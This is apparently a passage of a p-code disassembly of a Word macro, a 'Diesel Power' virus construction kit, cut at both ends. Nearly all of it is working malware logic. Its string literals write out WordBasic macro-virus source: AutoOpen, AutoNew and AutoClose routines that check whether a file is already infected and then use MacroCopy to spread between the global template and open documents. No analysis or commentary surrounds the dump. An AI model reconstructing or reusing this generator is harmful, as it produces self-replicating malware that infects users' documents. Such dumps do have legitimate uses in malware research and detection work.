' 	Ld dlg 
' 	MemLd Day$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	Ld dlg 
' 	MemLd Day$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x001F 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #75:
' 	GoTo ErrNumber 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld dlg 
' 	MemLd TwoBox5 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld dlg 
' 	MemLd Hour$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0000 
' 	Lt 
' 	Paren 
' 	Ld dlg 
' 	MemLd Hour$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #80:
' 	GoTo ErrNumber 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld dlg 
' 	MemLd TwoBox6 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #84:
' 	Ld dlg 
' 	MemLd Second$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0000 
' 	Lt 
' 	Paren 
' 	Ld dlg 
' 	MemLd Second$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x003B 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #85:
' 	GoTo ErrNumber 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	GoTo Creator 
' Line #89:
' Line #90:
' 	Label ErrNumber 
' Line #91:
' 	LitStr 0x001A "Error in time of payload !"
' 	LitStr 0x0011 "Diesel Power v1.0"
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #92:
' 	GoTo Clo 
' Line #93:
' Line #94:
' 	Label Creator 
' Line #95:
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0000 
' Line #96:
' 	LitStr 0x0037 "'======================================================"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #97:
' 	LineCont 0x0004 15 00 00 00
' 	LitStr 0x0001 "'"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd New$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A " virus by "
' 	Add 
' 	Ld dlg 
' 	MemLd Author$ 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #98:
' 	LitStr 0x0034 "'Created with Diesel Power VCK (c)by XaRaBaS [DkpRJ]"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #99:
' 	LitStr 0x0037 "'======================================================"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #100:
' Line #101:
' 	LitStr 0x001D "'=== begin of macros AutoOpen"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #102:
' 	LitStr 0x0008 "Sub MAIN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #103:
' 	LitStr 0x0013 "On Error Goto QuitO"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #104:
' 	LitStr 0x000C "infected = 0"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #105:
' 	LitStr 0x001E "For i = 1 To CountMacros(0, 0)"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #106:
' 	LineCont 0x0004 0F 00 00 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0019 "If MacroName$(i, 0, 0) = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #107:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "infected = - 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #108:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #109:
' 	LitStr 0x0006 "Next i"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #110:
' 	LitStr 0x0014 "If infected = 0 Then"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #111:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0011 "FN$ = FileName$()"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #112:
' 	LineCont 0x0004 11 00 00 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #113:
' 	LineCont 0x0008 11 00 00 00 23 00 00 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Global:"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #114:
' 	Ld CheckBox1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #115:
' 	LineCont 0x0004 11 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "Global:AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	Ld CheckBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LineCont 0x0004 11 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld CheckBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #121:
' 	LineCont 0x0004 11 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	Ld CheckBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #124:
' 	LineCont 0x0008 0F 00 04 00 1D 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "MacroCopy FN$ + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #127:
' 	LitStr 0x0006 "QuitO:"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #128:
' 	LitStr 0x0007 "End Sub"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #129:
' 	LitStr 0x001B "'=== end of macros AutoOpen"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #130:
' Line #131:
' 	Ld dlg 
' 	MemLd CheckBox1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	LitStr 0x001C "'=== begin of macros AutoNew"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #133:
' 	LitStr 0x0008 "Sub MAIN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #134:
' 	LitStr 0x0013 "On Error Goto QuitN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #135:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #136:
' 	LitStr 0x000C "Infected = 0"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #137:
' 	LitStr 0x001E "For i = 1 To CountMacros(1, 0)"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #138:
' 	LineCont 0x0004 0F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0019 "If MacroName$(i, 1, 1) = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #139:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000C "infected = 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #140:
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #141:
' 	LitStr 0x0006 "Next i"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #142:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #143:
' 	LitStr 0x0014 "If infected = 1 Then"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #144:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "Goto QuitN"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #145:
' 	LitStr 0x0004 "Else"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #146:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #147:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0016 "FileSaveAs .Format = 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #148:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #149:
' 	LineCont 0x0008 11 00 04 00 23 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Global:"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #150:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "Global:AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #151:
' 	Ld dlg 
' 	MemLd CheckBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #152:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	Ld dlg 
' 	MemLd CheckBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #155:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	Ld dlg 
' 	MemLd CheckBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #158:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B ":FileSaveAs"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0010 "FileSaveAll 1, 0"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #161:
' 	LitStr 0x0006 "End If"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #162:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #163:
' 	LitStr 0x0006 "QuitN:"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #164:
' 	LitStr 0x0007 "End Sub"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #165:
' 	LitStr 0x001A "'=== end of macros AutoNew"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #166:
' 	EndIfBlock 
' Line #167:
' Line #168:
' 	Ld dlg 
' 	MemLd CheckBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #169:
' 	LitStr 0x001E "'=== begin of macros AutoClose"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #170:
' 	LitStr 0x0008 "Sub MAIN"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #171:
' 	LitStr 0x0013 "On Error Goto QuitC"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #172:
' 	LitStr 0x000C "infected = 0"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #173:
' 	LitStr 0x001E "For i = 1 To CountMacros(1, 0)"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #174:
' 	LineCont 0x0004 0F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0019 "If MacroName$(i, 1, 1) = "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 " Then"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #175:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "infected = 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #176:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #177:
' 	LitStr 0x0006 "Next i"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #178:
' 	Ld T$ 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #179:
' 	LitStr 0x0014 "If infected = 1 Then"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #180:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "Goto QuitC"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #181:
' 	LitStr 0x0004 "Else"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #182:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #183:
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0016 "FileSaveAs .Format = 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #184:
' 	LineCont 0x0008 11 00 04 00 21 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Global:"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C ",FileName$()"
' 	Add 
' 	LitDI2 0x002B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld dlg 
' 	MemLd Ident$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #185:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #186:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #187:
' 	Ld CheckBox1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #188:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "Global:AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 ":AutoNew"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ", 1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #189:
' 	EndIfBlock 
' Line #190:
' 	Ld CheckBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LineCont 0x0008 0F 00 08 00 18 00 08 00
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x000A "MacroCopy "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "Global:AutoExec"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0010 ", FileName$() + "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
